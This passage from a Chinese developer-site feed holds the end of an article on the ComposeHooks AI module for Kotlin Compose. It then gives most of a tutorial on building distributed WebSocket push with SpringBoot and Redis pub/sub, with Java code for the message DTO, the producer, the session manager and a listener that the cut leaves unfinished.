    <span class="hljs-keyword">val</span> steps: List&lt;String&gt;
)

<span class="hljs-keyword">val</span> (recipe, rawJson, isLoading, error, submit, stop) = useGenerateObject&lt;Recipe&gt;(
    schemaString = Recipe::<span class="hljs-keyword">class</span>.jsonSchemaString,
) {
    provider = Providers.DeepSeek(apiKey = <span class="hljs-string">"sk-xxx"</span>)
}

<span class="hljs-comment">// 生成食谱</span>
submit(<span class="hljs-string">"生成油爆双脆的菜谱"</span>)
</code></pre>
<p>它会自动：</p>
<ul>
<li>注入 JSON Schema 到系统提示</li>
<li>解析返回的 JSON 并生成类型安全对象</li>
<li>支持多模态输入（文本、图片）</li>
<li>内置错误处理</li>
</ul>
<p>PS：建议配合 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FKotlin%2Fkotlinx-schema%2F" target="_blank" title="https://github.com/Kotlin/kotlinx-schema/" ref="nofollow noopener noreferrer">kotlinx-schema</a> 使用，可以方便的从 Kotlin 类型创建 JSON Schema</p>
<h2 data-id="heading-3">实际项目案例</h2>
<p>在 EatWhat 项目的菜谱分析功能中，我使用 <code>useGenerateObject</code> 实现了一个支持文本+图片输入的 AI 分析功能：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> xyz.junerver.compose.ai.invoke

<span class="hljs-keyword">val</span> (prompt, setPrompt) = useGetState(initialPrompt ?: <span class="hljs-string">""</span>)
<span class="hljs-keyword">var</span> selectedImageBase64 <span class="hljs-keyword">by</span> _useState&lt;String?&gt;(<span class="hljs-literal">null</span>)

<span class="hljs-keyword">val</span> systemPrompt = <span class="hljs-string">"""
    你是一个专业的菜谱分析助手。请分析用户的输入（菜谱描述、做法、图片等），
    并输出符合 JSON Schema 的菜谱数据。

    注意：
    1. type 必须是 MEAT(荤菜), VEG(素菜), SOUP(汤), STAPLE(主食), OTHER(其他) 之一
    2. unit 必须是 G(克), ML(毫升), PIECE(个), SPOON(勺), MODERATE(适量) 之一
    3. icon 请根据菜品内容选择一个最合适的 Emoji
    4. 如果输入信息不全，请根据经验合理补全
"""</span>.trimIndent()

<span class="hljs-keyword">val</span> (recipe, rawJson, isLoading, error, submit, _) = useGenerateObject&lt;RecipeAIResult&gt;(
    schemaString = RecipeAIResult::<span class="hljs-keyword">class</span>.jsonSchemaString,
) {
    activeProvider?.let { provider -&gt;
        <span class="hljs-keyword">this</span>.provider = Providers.OpenAI(
            baseUrl = provider.baseUrl,
            apiKey = provider.apiKey
        )
        <span class="hljs-keyword">this</span>.model = provider.model
    }
    <span class="hljs-keyword">this</span>.systemPrompt = systemPrompt
    timeout = <span class="hljs-number">60.</span>seconds
}

<span class="hljs-comment">// 触发分析</span>
<span class="hljs-keyword">val</span> onAnalyze = {
    <span class="hljs-keyword">if</span> (selectedImageBase64 != <span class="hljs-literal">null</span>) {
        submit(promptText, selectedImageBase64!!, <span class="hljs-string">"image/webp"</span>)
    } <span class="hljs-keyword">else</span> {
        submit(promptText)
    }
}
</code></pre>
<p>这个实现有几个亮点：</p>
<ol>
<li><strong>多模态输入</strong> - 用户可以输入文字描述，也可以上传图片，AI 会综合分析</li>
<li><strong>类型安全</strong> - 返回的 <code>Recipe</code> 是一个数据类，直接使用即可，无需手动解析 JSON</li>
<li><strong>状态管理</strong> - <code>isLoading</code>、<code>error</code> 等状态自动管理，UI 响应式更新</li>
<li><strong>配置灵活</strong> - 可以动态切换 AI 服务商、模型、超时时间等</li>
</ol>
<h2 data-id="heading-4">核心优势</h2>
<p>与手动封装 OAI 接口请求方式相比，ComposeHooks AI 模块的优势非常明显：</p>
<ul>
<li><strong>统一接口</strong> - 无需关心不同服务商的 API 差异</li>
<li><strong>多模态支持</strong> - 文本、图片、文件无缝集成</li>
<li><strong>类型安全</strong> - GenerateObject 确保输出类型正确</li>
<li><strong>Compose 友好</strong> - 完全适配 Compose 生命周期</li>
<li><strong>流式响应</strong> - 实时显示 AI 回复（useChat）</li>
</ul>
<h2 data-id="heading-5">探索更多</h2>
<p>项目开源地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fjunerver%2FComposeHooks" target="_blank" title="https://github.com/junerver/ComposeHooks" ref="nofollow noopener noreferrer">junerver/ComposeHooks</a></p>
<p>欢迎尝鲜 beta 版本：</p>
<pre><code class="hljs language-kotlin" lang="kotlin">implementation(<span class="hljs-string">"xyz.junerver.compose:hooks2-ai:2.2.2-beta-1"</span>)
</code></pre>
<p>欢迎使用、勘误、PR。</p>
<p>注意：该模块尚在积极开发中，工件id、接口参数可能会随着版本更新发生变化，请访问 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fjunerver%2FComposeHooks" target="_blank" title="https://github.com/junerver/ComposeHooks" ref="nofollow noopener noreferrer">ComposeHooks</a> 确认最新版本与使用说明。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[SpringBoot 集成 Redis 实现分布式 WebSocket：跨实例消息推送实战]]></title>    <link>https://juejin.cn/post/7591778827308531752</link>    <guid>https://juejin.cn/post/7591778827308531752</guid>    <pubDate>2026-01-06T03:54:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591778827308531752" data-draft-id="7591778827307843624" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="SpringBoot 集成 Redis 实现分布式 WebSocket：跨实例消息推送实战"/> <meta itemprop="keywords" content="Java,WebSocket,Redis"/> <meta itemprop="datePublished" content="2026-01-06T03:54:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="uup"/> <meta itemprop="url" content="https://juejin.cn/user/4378706456356627"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            SpringBoot 集成 Redis 实现分布式 WebSocket：跨实例消息推送实战
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4378706456356627/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    uup
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T03:54:15.000Z" title="Tue Jan 06 2026 03:54:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在分布式系统中，单机 WebSocket 无法实现跨服务实例的消息推送（如用户连接在实例 A，而消息触发在实例 B）。本文基于前文 SpringBoot+Redis 缓存实践，结合 Redis 发布订阅（Pub/Sub）机制，实现<strong>分布式 WebSocket</strong>，解决跨实例消息推送问题，核心是通过 Redis 作为消息中转站，让所有服务实例共享消息通道。</p>
<h2 data-id="heading-0">一、核心设计思路</h2>
<p>分布式 WebSocket 的核心是 “Redis 发布订阅 + 本地 Session 管理”：</p>
<ol>
<li><strong>客户端连接</strong>：用户 WebSocket 连接到任意服务实例，实例将连接 Session 存入本地缓存；</li>
<li><strong>消息发布</strong>：任意实例产生推送消息时，通过 Redis 发布（Publish）到指定频道；</li>
<li><strong>消息订阅</strong>：所有服务实例订阅 Redis 频道，接收到消息后，检查本地是否有目标用户的 Session；</li>
<li><strong>消息推送</strong>：有目标用户 Session 的实例，将消息推送给对应的客户端。</li>
</ol>
<p>整个流程复用了 Redis 缓存实践中的<code>RedisTemplate</code>配置，无需额外引入依赖，保证技术栈统一。</p>
<h2 data-id="heading-1">二、环境准备</h2>
<p>复用前文<a href="https://juejin.cn/post/7590752433988436022" target="_blank" title="https://juejin.cn/post/7590752433988436022"> SpringBoot 集成 Redis 缓存实践</a></p>
<ul>
<li><strong>依赖</strong>：<code>spring-boot-starter-websocket</code>；</li>
</ul>
<h2 data-id="heading-2">三、核心代码实现</h2>
<h3 data-id="heading-3">1. 枚举定义：WebSocket 消息类型</h3>
<p>统一管理 WebSocket 消息类型，便于后续扩展不同业务的消息推送：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.demo.redis.enums;

<span class="hljs-keyword">import</span> lombok.AllArgsConstructor;
<span class="hljs-keyword">import</span> lombok.Getter;

<span class="hljs-comment">/**
 * WebSocket消息类型枚举
 */</span>
<span class="hljs-meta">@Getter</span>
<span class="hljs-meta">@AllArgsConstructor</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">DWebSocketType</span> {
    DEMO(<span class="hljs-string">"示例消息"</span>),
    NOTICE(<span class="hljs-string">"系统通知"</span>),
    ORDER(<span class="hljs-string">"订单消息"</span>),
    ;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String desc;
}
</code></pre>
<h3 data-id="heading-4">2. DTO 定义：WebSocket 消息体</h3>
<p>封装推送消息的通用结构，包含用户 ID、消息类型、消息内容：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.demo.redis.dto;

<span class="hljs-keyword">import</span> com.demo.redis.enums.DWebSocketType;
<span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> lombok.experimental.Accessors;

<span class="hljs-keyword">import</span> java.io.Serializable;

<span class="hljs-comment">/**
 * WebSocket推送请求DTO
 * 实现Serializable保证Redis传输时可序列化
 */</span>
<span class="hljs-meta">@Accessors(chain = true)</span>
<span class="hljs-meta">@Data</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DWebSocketReqDTO</span>&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Serializable</span>&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1292707161671865097L</span>;

    <span class="hljs-comment">/**
     * 消息类型 <span class="hljs-doctag">@see</span> DWebSocketType
     */</span>
    <span class="hljs-keyword">private</span> String type;
    <span class="hljs-comment">/**
     * 目标用户ID（推送的核心标识）
     */</span>
    <span class="hljs-keyword">private</span> Long userId;
    <span class="hljs-comment">/**
     * 消息体（支持任意序列化类型）
     */</span>
    <span class="hljs-keyword">private</span> T body;
}
</code></pre>
<h3 data-id="heading-5">3. 消息生产者：发布 Redis 消息</h3>
<p>封装 Redis 发布逻辑，统一消息推送入口，所有需要推送的场景都通过该类发布消息：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.demo.redis.producer;  
  
<span class="hljs-keyword">import</span> com.demo.redis.dto.DWebSocketReqDTO;  
<span class="hljs-keyword">import</span> lombok.AllArgsConstructor;  
<span class="hljs-keyword">import</span> lombok.extern.slf4j.Slf4j;  
<span class="hljs-keyword">import</span> org.springframework.data.redis.core.RedisTemplate;  
<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;  
  
<span class="hljs-keyword">import</span> javax.annotation.Resource;  
<span class="hljs-keyword">import</span> java.io.Serializable;  
  
  
<span class="hljs-comment">/**  
* WebSocket消息生产者  
* 负责将消息发布到Redis指定频道  
*/</span>  
<span class="hljs-meta">@Slf4j</span>  
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DWebSocketProducer</span> {  
  
<span class="hljs-keyword">private</span> RedisTemplate&lt;String, Object&gt; redisTemplate;  
<span class="hljs-keyword">private</span> String channel;  
  
<span class="hljs-keyword">public</span> <span class="hljs-title function_">DWebSocketProducer</span><span class="hljs-params">(RedisTemplate&lt;String, Object&gt; redisTemplate, String channel)</span> {  
<span class="hljs-built_in">this</span>.redisTemplate = redisTemplate;  
<span class="hljs-built_in">this</span>.channel = channel;  
}  
  
<span class="hljs-comment">/**  
* 发布WebSocket消息  
*  
* <span class="hljs-doctag">@param</span> reqDTO 消息体  
* <span class="hljs-doctag">@param</span> &lt;T&gt; 消息内容类型  
*/</span>  
<span class="hljs-keyword">public</span> &lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Serializable</span>&gt; <span class="hljs-keyword">void</span> <span class="hljs-title function_">send</span><span class="hljs-params">(DWebSocketReqDTO&lt;T&gt; reqDTO)</span> {  
log.info(<span class="hljs-string">"#websocket::send# 准备推送消息，userId={},type={}"</span>, reqDTO.getUserId(), reqDTO.getType());  
<span class="hljs-comment">// 参数校验：用户ID和消息类型不能为空  </span>
<span class="hljs-keyword">if</span> (reqDTO.getUserId() == <span class="hljs-literal">null</span> || reqDTO.getType() == <span class="hljs-literal">null</span>) {  
log.warn(<span class="hljs-string">"#websocket::send::return# 参数缺失，userId={},type={}"</span>, reqDTO.getUserId(), reqDTO.getType());  
<span class="hljs-keyword">return</span>;  
}  
<span class="hljs-comment">// 核心：Redis发布消息到指定频道  </span>
redisTemplate.convertAndSend(channel, reqDTO);  
log.info(<span class="hljs-string">"#websocket::send::success# 消息发布成功，userId={}"</span>, reqDTO.getUserId());  
}  
  
}
</code></pre>
<h3 data-id="heading-6">4. Session 管理器：本地连接管理</h3>
<p>管理当前服务实例的 WebSocket 连接 Session，提供增删查、自动清理等能力，是分布式推送的本地核心：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.demo.redis.manage;

<span class="hljs-keyword">import</span> cn.hutool.core.collection.CollectionUtil;
<span class="hljs-keyword">import</span> cn.hutool.core.util.StrUtil;
<span class="hljs-keyword">import</span> com.demo.redis.dto.DWebSocketReqDTO;
<span class="hljs-keyword">import</span> lombok.extern.slf4j.Slf4j;
<span class="hljs-keyword">import</span> org.apache.tomcat.websocket.WsSession;
<span class="hljs-keyword">import</span> org.springframework.web.socket.WebSocketSession;
<span class="hljs-keyword">import</span> org.springframework.web.socket.adapter.standard.StandardWebSocketSession;

<span class="hljs-keyword">import</span> javax.websocket.Session;
<span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> java.util.ArrayList;
<span class="hljs-keyword">import</span> java.util.HashMap;
<span class="hljs-keyword">import</span> java.util.List;
<span class="hljs-keyword">import</span> java.util.Map;
<span class="hljs-keyword">import</span> java.util.concurrent.ConcurrentHashMap;

<span class="hljs-comment">/**
 * WebSocket Session管理器
 * 管理当前实例的所有WebSocket连接，线程安全
 */</span>
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DWebSocketSessionManage</span> {
    <span class="hljs-comment">// 核心参数：Session池容量控制</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">CORE_SIZE</span> <span class="hljs-operator">=</span> <span class="hljs-number">30000</span>; <span class="hljs-comment">// 核心容量</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">MAX_SIZE</span> <span class="hljs-operator">=</span> <span class="hljs-number">50000</span>; <span class="hljs-comment">// 最大容量</span>

    <span class="hljs-comment">// 存储Session的最后访问时间（用于清理过期连接）</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map&lt;String, Long&gt; KEY_TIME_POOL = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(<span class="hljs-number">200</span>);
    <span class="hljs-comment">// 核心：存储用户ID与WebSocketSession的映射（线程安全）</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map&lt;String, WebSocketSession&gt; SESSION_POOL = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;(<span class="hljs-number">200</span>);

    <span class="hljs-comment">/**
     * 添加Session到本地缓存
     * <span class="hljs-doctag">@param</span> key 唯一标识（格式：sk::userId）
     * <span class="hljs-doctag">@param</span> session WebSocket连接
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(String key, WebSocketSession session)</span> {
        <span class="hljs-keyword">if</span> (StrUtil.isBlank(key)) {
            <span class="hljs-keyword">return</span>;
        }
        <span class="hljs-comment">// 先清理过期/超量连接，防止内存溢出</span>
        clear();
        <span class="hljs-comment">// 更新最后访问时间</span>
        KEY_TIME_POOL.put(key, System.currentTimeMillis());
        <span class="hljs-comment">// 存储Session</span>
        SESSION_POOL.put(key, session);
        log.info(<span class="hljs-string">"#websocket::add# Session添加成功，key={},当前连接数={}"</span>, key, SESSION_POOL.size());
    }

    <span class="hljs-comment">/**
     * 清理超量连接（保留核心容量）
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">clear</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (KEY_TIME_POOL.size() &gt; MAX_SIZE) {
            log.warn(<span class="hljs-string">"#websocket::clear# 连接数超过最大值{}，开始清理"</span>, MAX_SIZE);
            <span class="hljs-comment">// 将连接按最后访问时间升序排序，优先清理最久未使用的</span>
            List&lt;Map.Entry&lt;String, Long&gt;&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(KEY_TIME_POOL.entrySet());
            list.sort(Map.Entry.comparingByValue());

            <span class="hljs-type">int</span> <span class="hljs-variable">clearCount</span> <span class="hljs-operator">=</span> MAX_SIZE - CORE_SIZE; <span class="hljs-comment">// 需要清理的数量</span>
            <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
            <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Long&gt; entry : list) {
                <span class="hljs-keyword">if</span> (count &lt; clearCount) {
                    remove(entry.getKey()); <span class="hljs-comment">// 移除连接并关闭Session</span>
                    count++;
                } <span class="hljs-keyword">else</span> {
                    <span class="hljs-keyword">break</span>;
                }
            }
            log.info(<span class="hljs-string">"#websocket::clear::success# 清理完成，共清理{}个连接"</span>, count);
        }
    }

    <span class="hljs-comment">/**
     * 获取用户的Session
     * <span class="hljs-doctag">@param</span> key 唯一标识
     * <span class="hljs-doctag">@return</span> WebSocketSession
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> WebSocketSession <span class="hljs-title function_">get</span><span class="hljs-params">(String key)</span> {
        <span class="hljs-keyword">if</span> (StrUtil.isBlank(key)) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
        }
        <span class="hljs-comment">// 更新最后访问时间（防止被清理）</span>
        KEY_TIME_POOL.put(key, System.currentTimeMillis());
        <span class="hljs-keyword">return</span> SESSION_POOL.get(key);
    }

    <span class="hljs-comment">/**
     * 移除并关闭Session
     * <span class="hljs-doctag">@param</span> key 唯一标识
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">remove</span><span class="hljs-params">(String key)</span> {
        <span class="hljs-keyword">if</span> (StrUtil.isBlank(key)) {
            <span class="hljs-keyword">return</span>;
        }
        <span class="hljs-comment">// 清理时间记录</span>
        KEY_TIME_POOL.remove(key);
        <span class="hljs-comment">// 移除并关闭Session</span>
        <span class="hljs-type">WebSocketSession</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> SESSION_POOL.remove(key);
        <span class="hljs-keyword">if</span> (session != <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">try</span> {
                session.close();
                log.info(<span class="hljs-string">"#websocket::remove# Session关闭成功，key={}"</span>, key);
            } <span class="hljs-keyword">catch</span> (IOException e) {
                log.error(<span class="hljs-string">"#websocket::remove::error# Session关闭失败，key={}"</span>, key, e);
            }
        }
    }

    <span class="hljs-comment">/**
     * 根据消息体生成SessionKey
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getSessionKey</span><span class="hljs-params">(DWebSocketReqDTO reqDTO)</span> {
        <span class="hljs-keyword">if</span> (reqDTO.getUserId() == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
        }
        <span class="hljs-keyword">return</span> getSessionKey(reqDTO.getUserId());
    }

    <span class="hljs-comment">/**
     * 从WebSocketSession中解析用户ID，生成SessionKey
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getSessionKey</span><span class="hljs-params">(WebSocketSession session)</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 解析请求参数中的userId</span>
            <span class="hljs-type">StandardWebSocketSession</span> <span class="hljs-variable">standardSession</span> <span class="hljs-operator">=</span> (StandardWebSocketSession) session;
            <span class="hljs-type">WsSession</span> <span class="hljs-variable">wsSession</span> <span class="hljs-operator">=</span> (WsSession) standardSession.getNativeSession();
            List&lt;String&gt; userIdList = wsSession.getRequestParameterMap().get(<span class="hljs-string">"userId"</span>);
            <span class="hljs-keyword">if</span> (CollectionUtil.isEmpty(userIdList)) {
                log.warn(<span class="hljs-string">"#websocket::getSessionKey# Session中未获取到userId"</span>);
                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
            }
            <span class="hljs-keyword">return</span> getSessionKey(userIdList.get(<span class="hljs-number">0</span>));
        } <span class="hljs-keyword">catch</span> (Exception e) {
            log.error(<span class="hljs-string">"#websocket::getSessionKey::error# 解析SessionKey失败"</span>, e);
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
        }
    }

    <span class="hljs-comment">/**
     * 生成统一的SessionKey格式
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getSessionKey</span><span class="hljs-params">(Object userId)</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"sk::"</span> + userId; <span class="hljs-comment">// 格式：sk::1001</span>
    }
}
</code></pre>
<h3 data-id="heading-7">5. Redis 消息监听器：订阅并推送消息</h3>
<p>订阅 Redis 频道的消息，接收到消息后，检查本地是否有目标用户的 Session，有则推送：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.demo.redis.listener;

<span class="hljs-keyword">import</span> cn.hutool.core.util.ObjectUtil;
<span class="hljs-keyword">import</span> cn.hutool.core.util.StrUtil;
<span class="hljs-keyword">import</span> cn.hutool.json.JSONUtil;
<span class="hljs-keyword">import</span> com.demo.redis.dto.DWebSocketReqDTO;
<span class="hljs-keyword">import</span> com.demo.redis.manage.DWebSocketSessionManage;
<span class="hljs-keyword">import</span> lombok.AllArgsConstructor;
<span class="hljs-keyword">import</span> lombok.extern.slf4j.Slf4j;
<span class="hljs-keyword">import</span> org.springframework.data.redis.connection.Message;
<span class="hljs-keyword">import</span> org.springframework.data.redis.connection.MessageListener;
<span class="hljs-keyword">import</span> org.springframework.data.redis.core.RedisTemplate;
<span class="hljs-keyword">import</span> org.springframework.web.socket.TextMessage;
<span class="hljs-keyword">import</span> org.springframework.web.socket.WebSocketSession;

<span class="hljs-comment">/**
 * Redis消息监听器
 * 订阅Redis频道，接收消息并推送给本地连接的客户端
 */</span>
<span class="hljs-meta">@AllArgsConstructor</span>
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DWebSocketRedisMessageListener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MessageListener</span> {

    <span class="hljs-keyword">private</span> RedisTemplate&lt;String, Object&gt; redisTemplate;

    <span class="hljs-comment">/**
     * 核心方法：接收到Redis消息后的处理逻辑
     */</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onMessage</span><span class="hljs-params">(Message message, <span class="hljs-type">byte</span>[] pattern)</span> {
        <span class="hljs-comment">// 1. 反序列化Redis消息</span>
